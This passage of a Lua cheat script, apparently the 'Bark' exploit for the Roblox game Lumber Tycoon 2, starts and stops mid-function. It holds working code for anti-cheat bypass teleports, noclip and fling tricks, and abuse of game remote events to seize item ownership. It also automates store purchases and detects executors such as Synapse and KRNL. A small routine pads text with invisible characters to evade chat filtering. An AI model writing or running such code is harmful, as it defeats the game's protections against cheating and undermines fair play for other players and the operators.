		ftouch(aB.HumanoidRootPart, workspace["Region_Underbridge"]["Teleporter"]:children()[2], true)
		ftouch(aB.HumanoidRootPart, workspace["Region_Underbridge"]["Teleporter"]:children()[2], false)
	end
end;
function stupidBypass1_b()
	local aB = game:GetService'Players'.LocalPlayer.Character;
	aB.HumanoidRootPart.CFrame = g;
	if h ~= nil then
		h:Disconnect()
		h = nil
	end;
	repeat
		i = true
	until wait(9.5)
	i = false
end;
function bodypos()
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local C = Instance.new("BodyPosition", aB.Torso)
	C.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	C.Position = g.p;
	C.P = 85000;
	local aC = game:GetService'RunService'.RenderStepped:connect(nocliprun)
	repeat
		wait()
	until (aB.Torso.CFrame.p - g.p).Magnitude < 65;
	aC:Disconnect()
	aC = nil;
	C:Destroy()
	for J = 1, 2 do
		aB.HumanoidRootPart.CFrame = g;
		aB.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		aB.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
		aB.Humanoid:ChangeState(8)
		wait()
	end
end;
function bodypos_mod()
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local C = Instance.new("BodyPosition", aB.Torso)
	C.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	C.Position = g.p;
	C.P = 85000;
	local aC = game:GetService'RunService'.RenderStepped:connect(nocliprun)
	repeat
		wait()
	until (aB.Torso.CFrame.p - g.p).Magnitude < 10;
	aC:Disconnect()
	aC = nil;
	C:Destroy()
end;
function voided()
	local aB = game:GetService'Players'.LocalPlayer.Character;
	aB.Humanoid:ChangeState(5)
	local G = Instance.new("BodyPosition", aB.Torso)
	G.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	G.Position = Vector3.new(0, 400000, 0)
	wait(.12)
	G:Destroy()
	wait()
	aB.HumanoidRootPart.CFrame = g;
	aB.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
	aB.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
	aB.Humanoid:ChangeState(8)
end;
function flingling()
	wait(0.2)
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local C = Instance.new("BodyGyro", aB.HumanoidRootPart)
	local R = math.huge;
	C.MaxTorque = Vector3.new(8500, 8500, 8500)
	C.P = 10000;
	C.D = 2e2;
	aB.Humanoid.PlatformStand = true;
	aB.Humanoid:ChangeState(3)
	aB.HumanoidRootPart.CFrame = aB.HumanoidRootPart.CFrame + Vector3.new(0, 15, 0)
	C.CFrame = CFrame.new(C.Parent.Position, Vector3.new(0, R, 0))
	local aD = game:GetService'RunService'.Stepped:wait()
	if 0.15 < 3 / aD then
		wait(0.15)
	else
		wait(3 / aD)
	end;
	aB.HumanoidRootPart.CFrame = g + Vector3.new(0, 4, 0)
	C.CFrame = CFrame.new(C.Parent.Position, Vector3.new(0, R, 0))
	aD = game:GetService'RunService'.Stepped:wait()
	if 0.15 < 3 / aD then
		wait(0.15)
	else
		if 3 / aD > 0.07 then
			wait(3 / aD)
		else
			wait(0.09)
		end
	end;
	C:Destroy()
	aB.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
	aB.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
	aB.HumanoidRootPart.CFrame = g;
	aB.Humanoid.PlatformStand = false;
	aB.Humanoid:ChangeState(8)
end;
function jumpBypass()
	local aB = game.Players.LocalPlayer.Character;
	local aE = aB.Humanoid:GetState() ~= Enum.HumanoidStateType.Jumping;
	if aE then
		aB.HumanoidRootPart.Velocity = Vector3.new(0, -500, 0)
		wait(0.1)
		aB.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		wait(0.1)
	end;
	local aF = "freezeMovement"
	game:GetService("ContextActionService"):BindAction(aF, function()
		return Enum.ContextActionResult.Sink
	end, false, unpack(Enum.PlayerActions:GetEnumItems()))
	wait(.1)
	aB.Humanoid.Jump = true;
	wait(.1)
	aB.HumanoidRootPart.CFrame = g;
	game:GetService("ContextActionService"):UnbindAction(aF)
end;
function stupidBypass2()
	local V = 900000;
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local aG = Instance.new("BodyVelocity", aB.HumanoidRootPart)
	aG.MaxForce = Vector3.new(0, V, 0)
	aG.Velocity = Vector3.new(0, -V, 0)
	aG.P = V;
	aB.Humanoid:ChangeState(8)
	wait(0.12)
	aG:Destroy()
	aB.HumanoidRootPart.CFrame = g;
	aB.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
	aB.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
	wait(0.12)
	aB.HumanoidRootPart.CFrame = g
end;
function safetp()
	wait(0.2)
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local C = Instance.new("BodyGyro", aB.HumanoidRootPart)
	local v = 90000;
	C.MaxTorque = Vector3.new(8500, 8500, 8500)
	C.P = 100000;
	C.D = 2e2;
	aB.Humanoid.PlatformStand = true;
	aB.Humanoid:ChangeState(3)
	aB.HumanoidRootPart.CFrame = aB.HumanoidRootPart.CFrame + Vector3.new(0, 30, 0)
	C.CFrame = CFrame.new(C.Parent.Position, Vector3.new(0, math.huge, 0))
	aB.HumanoidRootPart.Velocity = Vector3.new(v, v, v)
	aB.HumanoidRootPart.RotVelocity = Vector3.new(v, v, v)
	wait(0.6)
	aB.HumanoidRootPart.CFrame = g + Vector3.new(0, 4, 0)
	C.CFrame = CFrame.new(C.Parent.Position, Vector3.new(0, math.huge, 0))
	wait(0.3)
	C:Destroy()
	aB.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
	aB.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
	aB.HumanoidRootPart.CFrame = g;
	aB.Humanoid.PlatformStand = false;
	aB.Humanoid:ChangeState(8)
end;
function carMan()
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local aI = aB.Humanoid.SeatPart.Parent;
	if aB.Humanoid.SeatPart.Name ~= "DriveSeat" then
		return
	end;
	if (g.p - aB.HumanoidRootPart.CFrame.p).Magnitude >= 175 then
		local aJ = aI.PrimaryPart.CFrame + Vector3.new(0, 5, 0)
		local aK = 20;
		if aI.Seat:FindFirstChild'SeatWeld' then
			aK = 30
		end;
		local aL = aK;
		for J = 1, aK do
			aL = aL * 1.05;
			game:GetService'RunService'.RenderStepped:wait()
			aI:SetPrimaryPartCFrame(aJ * CFrame.Angles(0, math.rad(aL * J), 0))
		end;
		for J = 1, 0.8 * aK do
			game:GetService'RunService'.RenderStepped:wait()
			aI:SetPrimaryPartCFrame(g)
		end
	else
		aI:SetPrimaryPartCFrame(g)
	end
end;
function optimizedTween(aM)
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local aN = workspace.Gravity;
	workspace.Gravity = 0;
	wait(0.2)
	local aO = game:GetService("TweenService"):Create(aB.HumanoidRootPart, TweenInfo.new(aM / 1600, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0), {
		CFrame = g
	})
	aO:Play()
	aO.Completed:Wait()
	workspace.Gravity = aN;
	aB.HumanoidRootPart.CFrame = g
end;
function beta_mode()
end;
function getTieredAxe()
	return {['Beesaxe'] = 13,['AxeAmber'] = 12,['ManyAxe'] = 15,['BasicHatchet'] = 0,['RustyAxe'] = -1,['Axe1'] = 2,['Axe2'] = 3,['AxeAlphaTesters'] = 9,['Rukiryaxe'] = 8,['Axe3'] = 4,['AxeBetaTesters'] = 10,['FireAxe'] = 11,['SilverAxe'] = 5,['EndTimesAxe'] = 16,['AxeChicken'] = 6,['CandyCaneAxe'] = 1,['AxeTwitter'] = 7,['CandyCornAxe'] = 14}
end;
function getAxeList()
	local aP = {}
	for J, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		table.insert(aP, v)
	end;
	local aQ = game.Players.LocalPlayer.Character;
	if aQ:FindFirstChildOfClass"Tool" then
		table.insert(aP, aQ:FindFirstChildOfClass("Tool"))
	end;
	return aP
end;
function getWorstAxe()
	local aQ = game.Players.LocalPlayer.Character;
	if aQ:FindFirstChildOfClass"Tool" then
		local y = aQ:FindFirstChildOfClass"Tool"
		if y:FindFirstChild("ToolName") then
			return y
		end
	end;
	local aR = 9999;
	local aS = nil;
	local aT = getTieredAxe()
	for J, v in pairs(getAxeList()) do
		if v:FindFirstChild("ToolName") then
			if aT[v.ToolName.Value] < aR then
				aS = v;
				aR = aT[v.ToolName.Value]
			end
		end
	end;
	return aS
end;
function getBestAxe()
	local aQ = game.Players.LocalPlayer.Character;
	if aQ:FindFirstChildOfClass"Tool" then
		local y = aQ:FindFirstChildOfClass"Tool"
		if y:FindFirstChild("ToolName") then
			return y
		end
	end;
	local aU = -1;
	local aV = nil;
	local aT = getTieredAxe()
	for J, v in pairs(getAxeList()) do
		if v:FindFirstChild("ToolName") then
			if aT[v.ToolName.Value] > aU then
				aV = v;
				aU = aT[v.ToolName.Value]
			end
		end
	end;
	return aV
end;
local aW = nil;
function getBestSawmill()
	local aU = nil;
	for J, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") and v:FindFirstChild("ItemName") and v.Owner.Value == game.Players.LocalPlayer and v.ItemName.Value:sub(1, 7) == "Sawmill" then
			if not aU then
				aU = v
			else
				if #v.ItemName.Value > #aU.ItemName.Value then
					aU = v
				elseif tonumber(v.ItemName.Value:sub(8, 8)) > tonumber(aU.ItemName.Value:sub(8, 8)) then
					aU = v
				end
			end
		end
	end;
	return aU
end;
local N = game:GetService'Players'.LocalPlayer:GetMouse()
local aX = false;
local aY = false;
local aZ = true;
local a_ = nil;
local b0 = nil;
local b1 = false;
function getMouseTarget()
	local b2 = game:GetService("UserInputService"):GetMouseLocation()
	return workspace:FindPartOnRayWithIgnoreList(Ray.new(workspace.CurrentCamera.CFrame.p, workspace.CurrentCamera:ViewportPointToRay(b2.x, b2.y, 0).Direction * 1000), game.Players.LocalPlayer.Character:GetDescendants())
end;
local b3 = false;
for J, v in pairs(game.Players:GetPlayers()) do
	if v.Name == "codeprime8" then
		b3 = true
	end
end;
function _G.disconnect_ctp()
	aZ = false;
	b1 = false
end;
function dobypass(b4)
	local b5 = "ۥֹ"
	return b4:gsub('.', function(D)
		if D == " " then
			return D
		end;
		return D..b5
	end)
end;
N.Button1Down:connect(function()
	if not aZ then
		return
	end;
	if aX and aZ then
		_G.DogixLT2TPC(CFrame.new(N.Hit.p) + Vector3.new(0, 3, 0), o)
	end
end)
local b6 = false;
local b7 = true;
game:GetService('UserInputService').InputBegan:connect(function(b8, O)
	if b8.UserInputType == Enum.UserInputType.Keyboard and aZ then
		if b8.KeyCode == _G.ClickTPKey then
			if b7 == true then
				aX = true
			else
				_G.DogixLT2TPC(CFrame.new(N.Hit.p) + Vector3.new(0, 3, 0), o)
			end
		end;
		if b8.KeyCode == Enum.KeyCode.Space and _G.ijp_toggle then
			aY = true
		end;
		if b8.KeyCode == _G.SprintKey then
			b6 = true
		end;
		if b8.KeyCode == _G.ZoomKey then
			zoom = true
		end
	end
end)
game:GetService('UserInputService').InputEnded:connect(function(b8, O)
	if b8.UserInputType == Enum.UserInputType.Keyboard and aZ then
		if b8.KeyCode == Enum.KeyCode.LeftControl then
			aX = false
		end;
		if b8.KeyCode == _G.GuiToggleKey then
			for J, v in pairs(game:GetService'CoreGui':children()) do
				if v.Name == "BarkUI" then
					v.Enabled = not v.Enabled
				end
			end
		end;
		if b8.KeyCode == Enum.KeyCode.Space and _G.ijp_toggle then
			aY = false
		end;
		if b8.KeyCode == _G.SprintKey then
			b6 = false
		end;
		if b8.KeyCode == _G.ZoomKey then
			zoom = false;
			workspace.CurrentCamera.FieldOfView = _G.SetStats[8]
		end
	end
end)
function Action(b9, ba)
	if b9 ~= nil then
		ba(b9)
	end
end;
function _G.DogixLT2GetKey(bb)
	return o
end;
local bc = ""
local bd = nil;
local be = nil;
function _G.DogixLT2TP(V, am, bf, bg)
	local bh = false;
	if bg ~= o and bg ~= o + 1 then
		send(" ! global key not detected! script denied access.\n")
		game.GlobalKeyNotDetected.GlobalKeyNotDetected = nil
	elseif bg == o + 1 then
		bh = true
	end;
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local aM = (Vector3.new(V, am, bf) - aB.HumanoidRootPart.CFrame.p).Magnitude;
	if aM > 9000 and not bh then
		error'tp distance too long!'
		game.TPDistanceTooLong.TPDistanceTooLong = true
	end;
	g = CFrame.new(V, am, bf)
	if aM < 230 and (not aB.Humanoid.Seated or aB.Humanoid.SeatPart == nil) and j ~= -1 then
		aB.HumanoidRootPart.CFrame = g
	elseif isnotcustom() then
		if j == -1 then
			if not aB.Humanoid.Seated or aB.Humanoid.SeatPart == nil then
				if aM < 150 then
					aB.HumanoidRootPart.CFrame = g
				else
					queued = g
				end
			else
				carMan()
			end
		end;
		if j == 0 then
			if aB.Humanoid.Seated and aB.Humanoid.SeatPart ~= nil then
				carMan()
			elseif (aj() or i) and firetouchinterest then
				stupidBypass1()
			else
				voided()
			end
		end;
		if j == 1 then
			if aB.Humanoid.Seated and aB.Humanoid.SeatPart ~= nil then
				carMan()
			else
				stupidBypass1()
			end
		end;
		if j == 2 then
			flingling()
		end;
		if j == 3 then
			jumpBypass()
		end;
		if j == 4 then
			optimizedTween(aM)
		end;
		if j == 5 then
			carMan()
		end;
		if j == 6 then
			safetp()
		end;
		if j == 7 then
			bodypos()
		end;
		if j == 8 then
			voided()
		end;
		if j == 3564 and b then
			beta_mode()
		end
	else
		_G.OtherPos = g;
		loadstring(bc)()
		_G.OtherPos = nil
	end
end;
function _G.DogixLT2TPC(g, o)
	_G.DogixLT2TP(g.X, g.Y, g.Z, o)
end;
function _G.DogixLT2Method(bi)
	if tostring(bi) ~= "get" then
		if bi < -2 and bi > 8 and bi ~= 3564 then
			game.InvalidMethodNumber.InvalidMethodNumber = true
		else
			if bi ~= 3564 then
				j = bi
			elseif b then
				j = bi
			end
		end
	else
		return j
	end
end;
local bj = 0;
function _G.DogixLT2DragAlt(part, bk)
	if (part.CFrame.p - game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame.p).Magnitude > 50 then
		local bl = Vector3.new(5, 5, 5)
		if part.Name ~= "WoodSection" then
			bl = Vector3.new(0, 0, 0)
		end;
		_G.DogixLT2TPC(part.CFrame + bl, o)
	end;
	for J = 1, 5 do
		spawn(function()
			game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(part.Parent)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(part.Parent)
			game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(part.Parent)
			part.CFrame = bk;
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(part.Parent)
		end)
		game:GetService'RunService'.RenderStepped:wait()
	end;
	bj = bj + 1;
	if bj == 6 then
		bj = 0;
		wait(0.3)
	end
end;
function tocf(part, bm, bn)
	if bn > 1 then
		part.Parent:MoveTo(bm.p)
	else
		part.CFrame = bm
	end
end;
function _G.DogixLT2Drag(part, bk)
	local aa = 0;
	for al, v in pairs(part.Parent:GetDescendants()) do
		if v:IsA("Part") then
			aa = aa + 1
		end
	end;
	spawn(function()
		repeat
			game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(part.Parent)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(part.Parent)
			game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(part.Parent)
			wait()
			tocf(part, bk, aa)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(part.Parent)
		until isnetworkowner(part) or wait(2)
		if aa > 1 then
    		part.Parent:MoveTo(bk.p)
    	end
		part.CFrame = bk
	end)
end;
function price_of(bo)
	for J, v in pairs(game:GetService("ReplicatedStorage").Purchasables:GetDescendants()) do
		if v:IsA("Folder") and v.Name == bo and v:findFirstChild'Price' then
			return v.Price.Value
		end
	end;
	return nil
end;
function sellLandSign(bp)
	local bq = workspace.Stores.WoodRUs.Furnace.Rollers;
	bq.Parent = game.Lighting;
	local aJ = game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame;
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v.Name == "Model" and v:FindFirstChild("Settings") and v.Settings:FindFirstChild("PropertySoldSign") and v:FindFirstChild("Post") and v.Post.Anchored then
			_G.DogixLT2TPC(v.Main.CFrame, o)
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(v, "Take down sold sign")
		end
	end;
	wait(1)
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v.Name == "Model" and v:FindFirstChild("ItemName") and tostring(v.ItemName.Value) == "PropertySoldSign" and v:FindFirstChild("WoodSection") and v.Owner.Value == game:GetService'Players'.LocalPlayer then
			_G.DogixLT2Drag(v.Main, CFrame.new(314.240784, -2.65742993, 92.957222, 0.999394894, 0.0342548452, -0.00604006927, 5.92512439e-09, 0.173648447, 0.98480773, 0.0347832851, -0.984211802, 0.173543364))
			break
		end
	end;
	bq.Parent = workspace.Stores.WoodRUs.Furnace;
	if bp ~= true then
		_G.DogixLT2TPC(aJ, o)
	end
end;
function getExploit()
	return sentinelbuy and "Sentinel" or PROTOSMASHER_LOADED and "ProtoSmasher" or syn and "Synapse" or KRNL_LOADED and "KRNL" or "<can't detect>"
end;
function autobuy(J, R, D, br)
	if l == 1 then
		item = autobuy_v2(J, R, D, br)
	elseif l == 2 then
		item = rapid_autobuy(J, R, D, br)
	elseif l == 4 then
		item = legacy_autobuy(J, R, D, br)
	end;
	return item
end;
local bs = {}
local pce = game.ReplicatedStorage.NPCDialog.PromptChat.OnClientEvent:connect(function(bu, bv)
    if bs[bv.Name] == nil then
    	print(string.format("[BARK] Dumped NPC ID: %s - %s", bv.Name, bv.ID))
    	bs[bv.Name] = bv.ID;
    end
end)
game.ReplicatedStorage.NPCDialog.SetChattingValue:InvokeServer(1)
spawn(function()
    repeat wait(0.5) until bs["Thom"] ~= nil
    wait(3)
    pce:Disconnect()
    pce = nil
    game.ReplicatedStorage.NPCDialog.SetChattingValue:InvokeServer(0)
    if bs["Thom"] ~= nil then
        x("Bark "..a, "Automatically updated Auto-Buy.", 3)
    end
end)
local bt = false;
function getItemInfo(bw)
	local NameStore, Cashier, CID, StoreItems;
	for al, bx in pairs(workspace.Stores:children()) do
		if bx:FindFirstChild(bw) then
			if bx:FindFirstChild("Bed1") or bx:FindFirstChild("Seat_Couch") then
				NameStore = 'FurnitureStore'
				Cashier = workspace.Stores.FurnitureStore.Corey;
				StoreItems = bx
			elseif bx:FindFirstChild("Sawmill") or bx:FindFirstChild("Sawmill2") then
				NameStore = 'WoodRUs'
				Cashier = workspace.Stores.WoodRUs.Thom;
				StoreItems = bx
			elseif bx:FindFirstChild("Trailer2") or bx:FindFirstChild("UtilityTruck2") then
				NameStore = 'CarStore'
				Cashier = workspace.Stores.CarStore.Jenny;
				StoreItems = bx
			elseif bx:FindFirstChild("CanOfWorms") or bx:FindFirstChild("Dynamite") then
				NameStore = 'ShackShop'
				Cashier = workspace.Stores.ShackShop.Bob;
				StoreItems = bx
			elseif bx:FindFirstChild("Painting1") or bx:FindFirstChild("Painting2") then
				NameStore = 'FineArt'
				Cashier = workspace.Stores.FineArt.Timothy;
				StoreItems = bx
			elseif bx:FindFirstChild("GateXOR") or bx:FindFirstChild("NeonWireOrange") then
				NameStore = 'LogicStore'
				Cashier = workspace.Stores.LogicStore.Lincoln;
				StoreItems = bx
			else
				return false
			end
		elseif bw == "ManyAxe" then
			if bx:FindFirstChild("Bed1") or bx:FindFirstChild("Seat_Couch") then
				NameStore = 'FurnitureStore'
				Cashier = workspace.Stores.FurnitureStore.Corey;
				StoreItems = bx
			end
		end
	end;
	return {
		NameStore,
		Cashier,
		bs[Cashier.Name],
		StoreItems
	}
end;
function autobuy_v2(item, by, bz, bA)
	local bB = getItemInfo(item)
	local bC = bB[1]
	local Cashier = bB[2]
	local CID = bB[3]
	local StoreItems = bB[4]
	local bD = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted;
	local bE = bz or game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
	local bF = {}
	local bG = true;
	if StoreItems == nil then
		x("Auto-Buy", "Couldn't determine item's store.", 3)
		return
	end;
	for J = 1, by do
		local bH = StoreItems:FindFirstChild(item) or StoreItems:WaitForChild(item, 8)
		if not bH then
			x("Auto-Buy", "Item not in stock after 8 seconds, stopping Auto-Buy.", 3)
			return
		end;
		local bI = workspace.Stores[bC].Counter;
		local bJ = CFrame.new(bI.Position + Vector3.new(0, 0.24, 0)) * CFrame.Angles(0, math.rad(math.random(-3, 3)), 0)
		local bK = {
			["Character"] = Cashier,
			["Name"] = Cashier.Name,
			["ID"] = CID,
			["Dialog"] = nil
		}
		local bL = false;
		local bM = false;
		local bN = workspace.PlayerModels.ChildAdded:connect(function(v)
			local bO = item:lower():find("gift")
			v:WaitForChild("Owner")
			if bO then
				wait(0.1)
				if v == bH then
					return
				end
			end;
			if v.Owner.Value == game.Players.LocalPlayer then
				if not bO and (v:FindFirstChild("PurchasedBoxItemName") and v.PurchasedBoxItemName.Value == item) or bO and (v:FindFirstChild("ItemName") and v.ItemName.Value == item) then
					spawn(function()
					    if not locatedOnPlot(bE.p) then
    						for J = 1, 3 do
    							for J = 1, 2 do
    								game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
    								v.PrimaryPart.Rotation = Vector3.new(0, 0, 0)
    								v:MoveTo(bE.p)
    								game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
    								wait(0.05)
    							end
    						end
    					else
    					    dirtBaseDropInstant(v,bE)
    					end
					end)
					x("Auto-Buy", "Purchased item, "..by - J.." remain.", 0.5)
					table.insert(bF, v)
					bL = true
				end
			end
		end)
		local bP = bI.Touched:connect(function(v)
			for J, v in pairs(bH.PrimaryPart:GetTouchingParts()) do
				if v.Name == "Counter" then
					bM = true;
					return
				end
			end
		end)
		if isnetworkowner then
			if isnetworkowner(bH.PrimaryPart) == true then
				repeat
					bH:SetPrimaryPartCFrame(bJ)
					wait(0.075)
				until bM == true or not isnetworkowner(bH.PrimaryPart)
				bM = isnetworkowner(bH.PrimaryPart)
			end
		end;
		if not bM or bG then
			_G.DogixLT2TPC(bH.PrimaryPart.CFrame + Vector3.new(5, 2, 5), o)
			repeat
				wait()
			until (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.p - bH.PrimaryPart.CFrame.p).Magnitude < 30;
			if bG then
				wait(0.3)
				bG = false
			end
		end;
		game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(bH)
		for J = 1, 200 do
			if bM then
				break
			end;
			if abortbuy then
				bP:Disconnect()
				bP = nil;
				abortbuy = false
				_G.DogixLT2TPC(bE, o)
				return
			end;
    		game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(bH)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(bH)
			bH:SetPrimaryPartCFrame(bJ)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(bH)
			wait()
		end;
		bM = false;
		bP:Disconnect()
		bP = nil;
		_G.DogixLT2TPC(bI.CFrame + Vector3.new(5, 2, 5), o)
		for J = 1, 80 do
			if bL then
				break
			end;
			if abortbuy then
				bN:Disconnect()
				bN = nil;
				_G.DogixLT2TPC(bE, o)
				return
			end;
			for J, v in pairs({
				"Initiate",
				"ConfirmPurchase",
				"EndChat"
			}) do
				bD:InvokeServer(bK, v)
			end
		end;
		local bQ = false;
		local bR = false;
		spawn(function()
			wait(4)
			bQ = not bL and not abortbuy and not bR
		end)
		repeat
			wait()
		until bL or abortbuy or bQ;
		bQ = false;
		bR = true;
		if not bL then
			x("Auto-Buy", "Failed item.", 0.5)
		end;
		bL = false;
		bN:Disconnect()
		bN = nil;
		if abortbuy then
			_G.DogixLT2TPC(bE, o)
			return
		end
	end;
	if bA ~= false then
		_G.DogixLT2TPC(bE, o)
	end;
	x("Auto-Buy", "Finished all items.", 1)
	return by == 1 and bF[1] or bF
end;
function legacy_autobuy(J, R, D, br)
	local bw = J;
	local bS = tonumber(R)
	local aH = game:GetService'Players'.LocalPlayer;
	local bT = game:GetService'ReplicatedStorage'
	local bU = bT.NPCDialog.PlayerChatted;
	local bV = nil;
	local bW = bT.Interaction.ClientIsDragging;
	local bX = nil;
	local bY = true;
	if D ~= nil then
		bX = D
	else
		bX = aH.Character.HumanoidRootPart.CFrame
	end;
	if not InBuy then
		local bZ = tick()
		ctr = 0;
		InBuy = true;
		local b_ = getItemInfo(bw)
		if not b_ then
			InBuy = false;
			return
		end;
		NameStore = b_[1]
		Cashier = b_[2]
		CID = b_[3]
		StoreItems = b_[4]
		x("Auto-Buy", "Started buying items.", .5)
		wait(0.3)
		local c0 = {}
		local bY = 0.3;
		for J = 1, bS do
			if StoreItems == nil then
				x("Auto-Buy", "A critical error occured, please notify dogix the item you were trying to purchase.", 3)
				InBuy = false
			end;
			local c1 = StoreItems:FindFirstChild(bw)
			if c1 == nil then
				bY = 0.4
			end;
			if StoreItems:WaitForChild(bw) or c1 then
				local c2 = 0;
				local c3 = workspace.PlayerModels.ChildAdded:connect(function(new)
					if new:WaitForChild("Owner").Value == aH and new:FindFirstChild("PurchasedBoxItemName") and new.PurchasedBoxItemName.Value == bw then
						if not _G.InfRanges then
							_G.DogixLT2TPC(workspace.Stores[NameStore].Counter.CFrame + Vector3.new(5, 2, 5), o)
						end;
						for J = 1, 3 do
							for J = 1, 2 do
								bW:FireServer(new)
								new.PrimaryPart.Rotation = Vector3.new(0, 0, 0)
								new:MoveTo(bX.p)
								bW:FireServer(new)
							end;
							c2 = 1
						end;
						x("Auto-Buy", "Purchased "..bw..". ("..tostring(bS - ctr - 1).." remain)", .5)
						if bS == 1 then
							c0 = new
						else
							table.insert(c0, new)
						end
					end
				end)
				local item = StoreItems[bw]
				item:WaitForChild("Owner")
				wait()
				local c4 = false;
				local c5 = workspace.Stores[NameStore].Counter.Touched:connect(function(new)
					for J, v in pairs(item.PrimaryPart:GetTouchingParts()) do
						if v.Name == "Counter" then
							c4 = true;
							return
						end
					end
				end)
				if not _G.InfRanges then
					_G.DogixLT2TPC(item.PrimaryPart.CFrame + Vector3.new(5, 2, 5), o)
					wait(bY)
					bY = 0.05
				end;
				game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(item)
				local c6 = CFrame.new(workspace.Stores[NameStore].Counter.Position + Vector3.new(0, 0.24, 0)) * CFrame.Angles(0, math.rad(math.random(-3, 3)), 0)
				if not _G.InfRanges and j == -1 then
					repeat
						wait()
					until i
				end;
				for J = 1, 800 do
					if not c4 then
						bW:FireServer(item)
						item:SetPrimaryPartCFrame(c6)
						bW:FireServer(item)
						wait()
					else
						break
					end
				end;
				if c5 ~= nil then
					c5:Disconnect()
					c5 = nil
				end;
				local dialog = Cashier:FindFirstChild'Dialog' or {
					BuyItem = {
						BuyPrompt = {
							ConfirmPurchase = {
								ItWorked = {
									Thanks = {}
								},
								NoThanks = {
									NoThanks = {}
								}
							},
							AbortPurchase = {}
						}
					}
				}
				for J = 1, 50 do
					if c2 <= 0 then
						bU:InvokeServer({
							Character = Cashier,
							Name = Cashier.Name,
							ID = CID,
							Dialog = dialog
						}, 'Initiate')
						bU:InvokeServer({
							Character = Cashier,
							Name = Cashier.Name,
							ID = CID,
							Dialog = dialog
						}, 'ConfirmPurchase')
						bU:InvokeServer({
							Character = Cashier,
							Name = Cashier.Name,
							ID = CID,
							Dialog = dialog
						}, 'EndChat')
					end
				end;
				repeat
					wait()
				until c2 == 1 or wait(1) or abortbuy;
				if abortbuy then
					InBuy = false;
					x("Auto-Buy", "Completed buying items. Took "..tick() - bZ.."s", .75)
					if br == nil then
						_G.DogixLT2TPC(bX, o)
					end;
					abortbuy = false;
					return c0
				end;
				if c2 == 0 then
					x("Auto-Buy", "Failed "..bw..".", .5)
				end;
				if c3 ~= nil then
					c3:Disconnect()
					c3 = nil
				end
			end;
			ctr = ctr + 1;
			wait(.02)
			if bS - ctr == 0 then
				InBuy = false;
				x("Auto-Buy", "Completed buying items. Took "..tick() - bZ.."s", .75)
				if br == nil then
					_G.DogixLT2TPC(bX, o)
				end;
				return c0
			end
		end
	else
		x("Auto-Buy", "Currently buying items.", 2)
	end
end;
function rapid_autobuy(J, R, D, br)
	local bw = J;
	local bS = tonumber(R)
	local aH = game:GetService'Players'.LocalPlayer;
	local bT = game:GetService'ReplicatedStorage'
	local bU = bT.NPCDialog.PlayerChatted;
	local bV = nil;
	local bW = bT.Interaction.ClientIsDragging;
	local bX = nil;
	local bY = true;
	if D ~= nil then
		bX = D
	else
		bX = aH.Character.HumanoidRootPart.CFrame
	end;
	if not InBuy then
		local bZ = tick()
		ctr = 0;
		InBuy = true;
		local b_ = getItemInfo(bw)
		if not b_ then
			InBuy = false;
			return
		end;
		local NameStore = b_[1]
		local Cashier = b_[2]
		local CID = b_[3]
		local StoreItems = b_[4]
		x("Auto-Buy", "Started buying items.", .5)
		wait(0.3)
		local c0 = {}
		local c2 = 0;
		local bI = 0;
		local c3 = workspace.PlayerModels.ChildAdded:connect(function(new)
			if new:WaitForChild("Owner").Value == aH and new:FindFirstChild("PurchasedBoxItemName") and new.PurchasedBoxItemName.Value == bw then
				local c7 = 20;
			    if not locatedOnPlot(bX.p) then
					for J = 1, 3 do
						for J = 1, 2 do
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(new)
							new.PrimaryPart.Rotation = Vector3.new(0, 0, 0)
							new:MoveTo(bX.p)
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(new)
							wait(0.05)
						end
					end
				else
				    dirtBaseDropInstant(bX,bE)
				end
				x("Auto-Buy", "Purchased "..bw..". ("..bS - bI.." remain)", .5)
